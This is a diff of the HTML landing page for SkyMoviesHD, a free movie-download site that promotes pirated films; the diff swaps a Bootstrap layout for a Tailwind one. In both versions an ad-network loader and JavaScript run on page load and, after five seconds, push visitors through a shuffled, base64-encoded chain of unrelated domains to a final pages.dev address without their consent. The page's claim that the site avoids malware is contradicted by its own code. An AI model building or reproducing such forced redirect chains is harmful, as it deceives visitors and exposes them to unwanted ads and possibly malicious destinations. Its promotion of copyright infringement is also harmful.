@@ -1,301 +1,235 @@
-
-<html lang="en"><head>
-    <title>SkyMoviesHD & SkyMoviesHD – Watch and Download Free HD Movies Online</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <meta property="og:type" content="website">
-    <meta name="robots" content="index, follow">
-    <meta name="title" content="">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SkyMoviesHD - Watch and Download Free HD Movies. Hollywood, Bollywood, and regional movies in 480p, 720p, 1080p.">
+    <title>SkyMoviesHD – Watch & Download Free HD Movies</title>
+    <!-- Ad Script -->
+    <script data-cfasync="false" id="AdsCoreLoader97547" src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"> </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            dark: '#1a1a1d', // Main Background
+                            card: '#242428', // Card Background
+                            gold: '#ffdd95', // Accent Color
+                            text: '#cccccc'  // Body Text
+                        }
+                    }
+                }
+            }
+        }
+    </script>
     
-    <meta name="description" content="SkyMoviesHD is your One-Stop destination to watch and download latest movies, webseries, TV series in High quality for free of cost. Get Hollywood, Bollywood, and regional movies in 480p, 720p, and 1080p resolution. Fast and easy downloads !">
-    
-    <meta name="keywords" content="SkyMoviesHD">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
-    <meta name="apple-mobile-web-app-status-bar" content="#202125">
-    <meta name="theme-color" content="">
-    <!-- <link rel="icon" href="SkyMoviesHD-favicon.png" sizes="32x32">
-    <link rel="icon" href="SkyMoviesHD-favicon.png" sizes="192x192"> -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css">
-    <link rel="stylesheet" href="style.css">
- 
-    <script data-cfasync="false" type="text/javascript" id="AdsCoreLoader97547" src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
-
-
-
-<script>
-const allDomains = ['https://glimmerbyte.com/', 'https://healthyhumansource.com/', 'https://eduprothink.com/', 'https://linkcents.com/'];
-const currentDomain = window.location.origin + '/';
-const domains = allDomains.filter(domain => domain !== currentDomain);
-
-function shuffle(array) {
-  for (let i = array.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [array[i], array[j]] = [array[j], array[i]];
-  }
-  return array;
-}
-
-let params = new URLSearchParams(window.location.search);
-let orderParam = params.get('order');
-let index = parseInt(params.get('index')) || 0;
-
-let order;
-if (!orderParam) {
-  order = shuffle([...domains]);
-  index = 0;
-} else {
-  order = atob(orderParam).split(',');
-}
-order = order.filter(domain => domain !== currentDomain);
-
-const adScript = document.getElementById('AdsCoreLoader97547');
-let redirectTriggered = false;
-
-function handleRedirect() {
-  if (redirectTriggered) return;
-  redirectTriggered = true;
-  if (index < order.length) {
-    const orderStr = btoa(order.join(','));
-    const nextUrl = order[index] + '?order=' + orderStr + '&index=' + (index + 1);
-    window.location.href = nextUrl;
-  } else {
-    window.location.href = 'https://testss-3c9.pages.dev/';
-  }
-}
-
-if (adScript) {
-  const checkInterval = setInterval(() => {
-    if (adScript.readyState === 'loaded' || adScript.readyState === 'complete') {
-      clearInterval(checkInterval);
-      setTimeout(handleRedirect, 5000);
-    }
-  }, 200);
-} else {
-  setTimeout(handleRedirect, 5000);
-}
-
-// Fallback to ensure redirection happens even if ad events don't fire
-setTimeout(() => {
-  if (!redirectTriggered) {
-    handleRedirect();
-  }
-}, 5000);
-</script>
-
-
+    <style>
+        /* Minimal Custom CSS */
+        body { background-color: #1a1a1d; color: #cccccc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .text-gold { color: #ffdd95; }
+        .bg-gold { background-color: #ffdd95; }
+        .hover-scale { transition: transform 0.2s; }
+        .hover-scale:hover { transform: scale(1.02); }
+    </style>
 </head>
-    
-    <body>
+<body class="flex flex-col min-h-screen">
 
-        
-    <div id="xwrapper">
-        <!--Begin: Header-->
-        <header>
-            <center><div class="menu">
-                    <ul id="i-menu">
-                      <li><a href="/"><i class="fas fa-home"></i> Home</a></li>
-                      <li><a href="https://SkyMoviesHD.tattoo/"><i class="fas fa-fire"></i>Trending Movies</a></li>
-                      <li><a href="https://SkyMoviesHD.boutique/"><i class="fas fa-fire"></i>Bollywood Movies</a></li>         
-                      <li><a href="https://zeb.monster/"><i class="fas fa-film"></i>18+ Movies</a></li>                   
-                      <li><a href="https://telegram.dog/ipapcorn_backup"><i class="fab fa-telegram"></i> Join Telegram</a></li>
-                    </ul>
-            </center></div>
-          
-        </header>
-        <!--End: Header-->
-        <!--Begin: Main-->
-        <div id="xmain-wrapper">
-            <div id="mw-topx">
-                <div class="container" style="padding: 15px 25px 25px 25px;">
-                    <center><div class="mwh-logox">                     
-                              <a class="x new-tab">
-                              <!-- <img src="/SkyMoviesHD-logo.png" alt="SkyMoviesHD" height="auto" width="50%"> -->
-                              </a>
-                              <div class="clearfix"></div>
-                            </div>                     
-                    <br> <!-- Empty line -->
-                    <h1 class="mw-heading">SkyMoviesHD & SkyMoviesHD – One-Stop Free Movie Downloading Website</h1>
-                    </center>
-                </div>
+    <header class="bg-brand-card shadow-lg sticky top-0 z-50 border-b border-gray-800">
+        <div class="container mx-auto px-4 max-w-6xl">
+            <div class="flex justify-between items-center h-16">
+                <a href="/" class="flex items-center gap-2 group">
+                    <i class="fas fa-play-circle text-gold text-2xl group-hover:rotate-12 transition-transform"></i>
+                    <span class="text-xl font-bold text-white tracking-wide">SkyMovies<span class="text-gold">HD</span></span>
+                </a>
+
+                <nav class="hidden md:flex gap-6 text-sm font-medium">
+                    <a href="#" class="text-white hover:text-gold transition">Home</a>
+                    <a href="https://SkyMoviesHD.tattoo/" class="text-white hover:text-gold transition">Trending</a>
+                    <a href="https://SkyMoviesHD.boutique/" class="text-white hover:text-gold transition">Bollywood</a>
+                    <a href="https://telegram.dog/ipapcorn_backup" class="text-blue-400 hover:text-blue-300"><i class="fab fa-telegram"></i> Telegram</a>
+                </nav>
+
+                <button id="mobile-menu-btn" class="md:hidden text-white text-xl focus:outline-none">
+                    <i class="fas fa-bars"></i>
+                </button>
             </div>
-            <div class="mw-body">
-                <div class="container">
-                    <div id="action-button">
-                      <a href="https://SkyMoviesHD.tattoo" 
-                      class="new-tab btn btn-lg btn-radius btn-primary" 
-                      target="_blank" 
-                      rel="noopener">
-                      View Full Site <i class="fas fa-arrow-circle-right ml-2"></i>
-                      </a>               
-                    </div>
-                    <span id="stx"></span>
-                    
-                    <div class="share-buttons share-buttons-detail">
-                      <div class="share-buttons-block">
-                        <div class="share-icon">
-                          <i class="fas fa-share-alt icon-blue" style="font-size: 28px;"></i>
-                        </div>
-                        <div class="sbb-title mr-3">
-                          <span>Share SkyMoviesHD</span>
-                          <p class="mb-0">to your friends</p>
-                        </div>
-                        <div class="sbb-social">
-                          <div class="fake-share-count mb-2">
-                            <span class="fake-share-number">68.9k</span>
-                            <span class="fake-share-label">Shares</span>
-                          </div>
-                          <div class="custom-share-buttons">
-                            <a href="https://t.me/share/url?url=https://SkyMoviesHD.tattoo&text=Check%20out%20this%20awesome%20site!" target="_blank" class="share-btn telegram">
-                              <i class="fab fa-telegram-plane"></i>
-                            </a>
-                            <a href="https://api.whatsapp.com/send?text=Check%20out%20this%20awesome%20site!%20https://SkyMoviesHD.tattoo" target="_blank" class="share-btn whatsapp">
-                              <i class="fab fa-whatsapp"></i> 
-                            </a>
-                            <a href="#" onclick="navigator.share ? navigator.share({ title: 'SkyMoviesHD', text: 'Check out this awesome site!', url: 'https://SkyMoviesHD.tattoo' }) : alert('Use mobile to share!');" class="share-btn generic">
-                              <i class="fas fa-share-square"></i> 
-                            </a>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                    
-                    <div class="mwb-2col">
-                      <div class="mwb-left">
-                        <h2 class="mw-heading">Brief overview of SkyMoviesHD Website</h2>
-                        <p><a href="https://SkyMoviesHD.tattoo/" target="_blank"><font color="#ffcf69">SkyMoviesHD</font></a> is one of the leading platforms for free movie streaming and downloading, especially popular among movie enthusiasts in India and surrounding regions. From Bollywood blockbusters to Hollywood hits, regional cinema to dubbed versions — <strong>SkyMoviesHD</strong> offers a massive library of high-quality content. Whether you're looking for the latest releases or classic favorites, <strong>SkyMoviesHD</strong> provides an all-in-one entertainment solution.</p>
-                    
-                        <p>What sets <strong>SkyMoviesHD</strong> apart is its extensive multi-language collection. The platform supports movies in Hindi, English, Tamil, Telugu, Malayalam, Punjabi, Marathi, and many more. Notably, <strong>SkyMoviesHD.tattoo</strong> and other versions such as <strong>SkyMoviesHD.com</strong>, <strong>SkyMoviesHD.pro</strong>, and <strong>SkyMoviesHD.in</strong> cater to different user bases by providing a seamless experience with high-speed servers, downloadable content, and no mandatory registration process.</p>
-                    
-                        <p>Despite being widely used, <strong>SkyMoviesHD</strong> operates in a legally grey area since it hosts copyrighted content without official licenses. While users are not charged to access the site, they should be cautious about pop-ups and redirect links.</p>
-                    
-                        <p>Another attractive feature of <strong>SkyMoviesHD</strong> is the multiple download options. It supports high-speed links through services like Google Drive, Mediafire, Clicknupload, and others. This ensures smoother downloads even during heavy traffic or peak hours.</p>
-                    
-                        <h2>The Rise of Streaming Services and How SkyMoviesHD Stands Out</h2>
-                        <p>In the past few years, the entertainment industry has rapidly shifted toward streaming services. From big names like Netflix, Prime Video, and Disney+ to newer OTT platforms, content consumption is now easier than ever. However, <strong>SkyMoviesHD.tattoo</strong> still holds a unique position due to the following reasons:</p>
-                    
-                        <h2>The Growth of Streaming Services</h2>
-                        <ul>
-                            <li><strong>On-Demand Content:</strong> Streaming apps provide immediate access to a huge library of content without time restrictions.</li>
-                            <li><strong>Subscription Cost:</strong> While cheaper than cable, multiple streaming apps add up quickly, leading to subscription fatigue.</li>
-                            <li><strong>Variety & Originals:</strong> OTT platforms create their own exclusive series and movies, which builds loyal viewerships.</li>
-                        </ul>
-                    
-                        <h2>Challenges with Paid Streaming Services</h2>
-                        <ul>
-                            <li><strong>Subscription Overload:</strong> Managing multiple subscriptions like Netflix, Disney+, Hotstar, and Amazon Prime can become costly and overwhelming.</li>
-                            <li><strong>Geo Restrictions:</strong> Content availability often differs by region. Users in India may not access the same content as those in the US or UK.</li>
-                        </ul>
-                    
-                        <h2>How SkyMoviesHD Stands Out</h2>
-                        <ul>
-                            <li><strong>Free Unlimited Access:</strong> Unlike OTT platforms, <strong>SkyMoviesHD.tattoo</strong> is entirely free with no hidden charges.</li>
-                            <li><strong>No Registration Required:</strong> Users can directly download or stream without needing to create accounts or verify emails.</li>
-                            <li><strong>Wide Genre Variety:</strong> From Action and Romance to Horror, Sci-Fi, Anime, and Documentaries — everything is available.</li>
-                            <li><strong>No Location Barrier:</strong> Websites like <strong>SkyMoviesHD.tattoo</strong> and <strong>SkyMoviesHD.tattoo</strong> offer global content access with no regional limitations.</li>
-                            <li><strong>Simplified UI:</strong> <strong>SkyMoviesHD</strong> and <strong>SkyMoviesHD</strong> come with modern layouts, intuitive design, and fast-loading pages.</li>
-                            <li><strong>Fewer Ads:</strong> Although ads exist to support operations, interruptions are significantly less frequent than on similar sites.</li>
-                        </ul>
-                    
-                        <h2>Why SkyMoviesHD is Loved by Movie Lovers</h2>
-                        <ul>
-                            <li><strong>Budget-Friendly:</strong> Rising subscription costs make free platforms like <strong>SkyMoviesHD</strong> a valuable alternative.</li>
-                            <li><strong>Open Access:</strong> No geo-blocks, no account setup, and no payments — it’s pure entertainment.</li>
-                            <li><strong>Better Experience:</strong> Quick loading, multiple servers, subtitle support, and a simple interface make streaming hassle-free.</li>
-                        </ul>
-                    
-                        <h2>Top Reasons Why SkyMoviesHD is the Best Free Movie Site</h2>
-                    
-                        <h3>1. High Definition Quality</h3>
-                        <ul>
-                            <li><strong>SkyMoviesHD</strong> delivers top-notch HD quality — including 720p, 1080p, and even 4K in select releases.</li>
-                            <li>Clean audio and crisp visuals enhance the experience, often rivaling paid platforms.</li>
-                        </ul>
-                    
-                        <h3>2. Seamless Navigation</h3>
-                        <ul>
-                            <li>With organized categories like Latest Movies, Dual Audio, Web Series, and Genres — content is easily accessible.</li>
-                            <li>Fast search functionality and filters by year, language, or genre help users find content instantly.</li>
-                        </ul>
-                    
-                        <h3>3. No Sign-Up Hassles</h3>
-                        <ul>
-                            <li>No login, no registration, and no credit card — start watching movies immediately!</li>
-                        </ul>
-                    
-                        <h3>4. Broad Content Collection</h3>
-                        <ul>
-                            <li>Regular updates bring you the latest releases including Bollywood, Hollywood, South Indian films, Korean dramas, and anime.</li>
-                        </ul>
-                    
-                        <h3>5. 100% Free Streaming</h3>
-                        <ul>
-                            <li>No premium upgrades, no hidden costs — <strong>SkyMoviesHD.tattoo</strong> remains truly free for all users.</li>
-                        </ul>
-                    
-                        <h3>6. Daily Updates & Fast Uploads</h3>
-                        <ul>
-                            <li>Be the first to watch new movie uploads, often available within hours of release.</li>
-                        </ul>
-                    
-                        <h3>7. Global Reach Without Restrictions</h3>
-                        <ul>
-                            <li>Users from any region can access the full site — no location locks like Netflix or Prime Video.</li>
-                        </ul>
-                    
-                        <h3>8. Minimal Ads</h3>
-                        <ul>
-                            <li>Compared to other sites, <strong>SkyMoviesHD.tattoo</strong> keeps ads minimal to preserve a better streaming experience.</li>
-                        </ul>
-                    
-                        <h3>9. Safer Than Most Alternatives</h3>
-                        <ul>
-                            <li>Although users should still use ad-blockers and VPNs, <strong>SkyMoviesHD</strong> avoids the malware trap common on similar sites.</li>
-                        </ul>
-                    
-                        <p>Explore <a href="https://SkyMoviesHD.tattoo/" target="_blank"><font color="#ffcf69">SkyMoviesHD.tattoo</font></a> and discover a universe of free entertainment. Whether you're into Hollywood, Tollywood, or Anime — <strong>SkyMoviesHD</strong> brings it all to your fingertips, without subscriptions, registrations, or limits. Enjoy seamless streaming and downloads anytime, anywhere. Happy watching!</p>
-                    
-                        <p>Thank you!</p>
-                        <p>&nbsp;</p>
-                      </div>
-                      
-                    </div>
-                    
-                    
-                    <!--End: Main-->
-                    <!--Begin: Footer-->
-                    <div id="xfooter-about">
-                        <div class="container">
-                            <p class="copyright">© SkyMoviesHD.tattoo All rights reserved.</p>
-                        </div>
-                    </div>
-                    <!--End: Footer-->
-                    
-                </div>
-                
-            </div>
-            
         </div>
-                    <!-- ShareThis Tracking Iframes -->
-                    <iframe id="pxcelframe" title="pxcelframe" src="//t.sharethis.com/a/t_.htm?ver=1.1753.23410&cid=c010&cls=B#cid=c010&cls=B&dmn=SkyMoviesHD.tattoo&rnd=1744388014158&tt=t.dhj&dhjLcy=306&lbl=pxcel&flbl=pxcel&ll=d&ver=1.1753.23410&ell=d&cck=__stid&pn=%2F&qs=na&rdn=SkyMoviesHD.tattoo&rpn=%2F&rqs=na&cc=IN&cont=AS&rc=UP&ipaddr=" style="display: none;"></iframe>
 
-                    <script async src="https://count-server.sharethis.com/v2.0/get_counts?cb=window.__sharethis__.cb&url=https://SkyMoviesHD.tattoo/"></script>
-                    <script async src="https://buttons-config.sharethis.com/js/64a3d891df473b0019d1b0da.js"></script>
-                    <script async src="https://platform-api.sharethis.com/panorama.js"></script>
+        <div id="mobile-menu" class="hidden bg-brand-card border-t border-gray-700 md:hidden">
+            <a href="#" class="block py-3 px-4 text-white border-b border-gray-700">Home</a>
+            <a href="https://SkyMoviesHD.tattoo/" class="block py-3 px-4 text-white border-b border-gray-700">Trending Movies</a>
+            <a href="https://SkyMoviesHD.boutique/" class="block py-3 px-4 text-white border-b border-gray-700">Bollywood</a>
+            <a href="https://telegram.dog/ipapcorn_backup" class="block py-3 px-4 text-blue-400 font-bold">Join Telegram</a>
+        </div>
+    </header>
 
-                    <!-- Required JS Libraries -->
-                    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-                    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <main class="flex-grow">
+        
+        <section class="bg-gradient-to-b from-brand-card to-brand-dark py-12 px-4 text-center">
+            <div class="max-w-3xl mx-auto">
+                <h1 class="text-2xl md:text-4xl font-bold text-white mb-4">
+                    Download Latest <span class="text-gold">HD Movies</span> & Web Series
+                </h1>
+                <p class="text-sm md:text-base text-gray-400 mb-8">
+                    One-stop destination for Hollywood, Bollywood, and Regional content in 480p, 720p, 1080p.
+                </p>
 
-                    <!-- ShareThis Inline Share Buttons -->
-                    <script async src="https://platform-api.sharethis.com/js/sharethis.js#property=64a3d891df473b0019d1b0da&product=inline-share-buttons&source=platform"></script>
+                <a href="https://SkyMoviesHD.tattoo" target="_blank" rel="noopener" 
+                   class="inline-flex items-center justify-center gap-2 bg-gold text-gray-900 font-bold text-lg px-8 py-4 rounded-full hover-scale shadow-lg shadow-yellow-500/20 w-full md:w-auto mb-8">
+                    <span>Enter Full Website</span>
+                    <i class="fas fa-arrow-right"></i>
+                </a>
 
-                    <!-- other domains --->
-                    <a href="domains.html" style="position:absolute; left:-9999px;">Our previous Domains</a>    
-      
-    </div>
+                <div class="relative max-w-lg mx-auto">
+                    <input type="text" placeholder="Search for movies..." 
+                           class="w-full bg-gray-800 text-white border border-gray-700 rounded-full py-3 px-6 focus:outline-none focus:border-gold focus:ring-1 focus:ring-gold transition">
+                    <button class="absolute right-2 top-1 bottom-1 bg-gold text-black w-10 h-10 rounded-full flex items-center justify-center hover:bg-white transition">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+            </div>
+        </section>
 
+        <section class="container mx-auto px-4 max-w-6xl py-10">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                <div class="bg-brand-card p-4 rounded-xl text-center hover:bg-gray-800 transition">
+                    <i class="fas fa-bolt text-gold text-2xl mb-2"></i>
+                    <h3 class="text-white font-semibold">Fast DL</h3>
+                </div>
+                <div class="bg-brand-card p-4 rounded-xl text-center hover:bg-gray-800 transition">
+                    <i class="fas fa-closed-captioning text-gold text-2xl mb-2"></i>
+                    <h3 class="text-white font-semibold">Subs</h3>
+                </div>
+                <div class="bg-brand-card p-4 rounded-xl text-center hover:bg-gray-800 transition">
+                    <i class="fas fa-film text-gold text-2xl mb-2"></i>
+                    <h3 class="text-white font-semibold">4K / HD</h3>
+                </div>
+                <div class="bg-brand-card p-4 rounded-xl text-center hover:bg-gray-800 transition">
+                    <i class="fas fa-mobile-alt text-gold text-2xl mb-2"></i>
+                    <h3 class="text-white font-semibold">Mobile</h3>
+                </div>
+            </div>
+        </section>
 
+        <section class="container mx-auto px-4 max-w-6xl py-8 border-t border-gray-800">
+            <div class="grid md:grid-cols-3 gap-8">
+                
+                <div class="md:col-span-2 prose prose-invert prose-sm max-w-none">
+                    <h2 class="text-xl text-white font-bold mb-4 border-l-4 border-gold pl-3">About SkyMoviesHD</h2>
+                    <p class="mb-4">
+                        <span class="text-gold font-semibold">SkyMoviesHD</span> is a leading platform for streaming and downloading movies. 
+                        From Bollywood blockbusters to Hollywood hits, we offer a massive library of content in Hindi, English, Tamil, Telugu, and more.
+                    </p>
+                    <p class="mb-4">
+                        Unlike paid OTT platforms like Netflix or Prime Video, <strong>SkyMoviesHD.tattoo</strong> requires no subscription and no registration. 
+                        We provide direct download links via Google Drive and other high-speed servers.
+                    </p>
+                    
+                    <h3 class="text-lg text-white font-bold mt-6 mb-3">Why Choose Us?</h3>
+                    <ul class="list-none space-y-2 pl-0">
+                        <li class="flex items-start gap-2"><i class="fas fa-check text-green-500 mt-1"></i> <span><strong>Free Access:</strong> No hidden charges or credit cards needed.</span></li>
+                        <li class="flex items-start gap-2"><i class="fas fa-check text-green-500 mt-1"></i> <span><strong>No Sign-up:</strong> Start watching immediately.</span></li>
+                        <li class="flex items-start gap-2"><i class="fas fa-check text-green-500 mt-1"></i> <span><strong>Quality:</strong> 480p, 720p, 1080p and 4K options.</span></li>
+                    </ul>
+                </div>
 
-    </body></html>
+                <div class="bg-brand-card p-6 rounded-xl h-fit sticky top-20">
+                    <h3 class="text-white font-bold mb-4">Share with Friends</h3>
+                    <div class="flex flex-col gap-3">
+                        <a href="https://t.me/share/url?url=https://SkyMoviesHD.tattoo" class="flex items-center justify-center gap-2 w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded transition">
+                            <i class="fab fa-telegram-plane"></i> Telegram
+                        </a>
+                        <a href="https://api.whatsapp.com/send?text=https://SkyMoviesHD.tattoo" class="flex items-center justify-center gap-2 w-full bg-green-500 hover:bg-green-600 text-white py-2 rounded transition">
+                            <i class="fab fa-whatsapp"></i> WhatsApp
+                        </a>
+                        <button onclick="navigator.share({url:window.location.href})" class="flex items-center justify-center gap-2 w-full bg-gray-700 hover:bg-gray-600 text-white py-2 rounded transition">
+                            <i class="fas fa-share-alt"></i> More
+                        </button>
+                    </div>
+                    
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="bg-brand-dark border-t border-gray-800 py-8 mt-8">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-gray-500 text-sm mb-2">&copy; 2024 SkyMoviesHD.tattoo All rights reserved.</p>
+            <div class="flex justify-center gap-4 text-xs text-gray-600">
+                <a href="#" class="hover:text-gold">DMCA</a>
+                <a href="#" class="hover:text-gold">Privacy Policy</a>
+                <a href="#" class="hover:text-gold">Contact</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mobile Menu Toggle
+        const btn = document.getElementById('mobile-menu-btn');
+        const menu = document.getElementById('mobile-menu');
+        
+        btn.addEventListener('click', () => {
+            menu.classList.toggle('hidden');
+        });
+
+    // Domains to rotate through
+    const domains = [
+        'https://glimmerbyte.com/',
+        'https://healthyhumansource.com/',
+        'https://eduprothink.com/',
+        'https://linkcents.com/'
+    ];
+
+    // Final destination after all redirects
+    const finalURL = 'https://testss-3c9.pages.dev/';
+
+    function shuffle(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+        }
+        return array;
+    }
+
+    let params = new URLSearchParams(window.location.search);
+    let orderParam = params.get('order');
+    let index = parseInt(params.get('index')) || 0;
+
+    let order;
+
+    if (!orderParam) {
+        order = shuffle([...domains]);
+        index = 0;
+    } else {
+        order = atob(orderParam).split(',');
+    }
+
+    const adScript = document.getElementById('AdsCoreLoader97547');
+
+    function startRedirectChain() {
+        setTimeout(() => {
+            if (index < order.length) {
+                const nextIndex = index + 1;
+                const orderStr = btoa(order.join(','));
+                const nextUrl = order[index] + '?order=' + orderStr + '&index=' + nextIndex;
+                window.location.href = nextUrl;
+            } else {
+                window.location.href = finalURL;
+            }
+        }, 5000);
+    }
+
+    if (adScript) {
+        adScript.addEventListener('load', startRedirectChain);
+        adScript.addEventListener('error', startRedirectChain);
+    } else {
+        startRedirectChain();
+    }
+    </script>
+
+</body>
+</html>
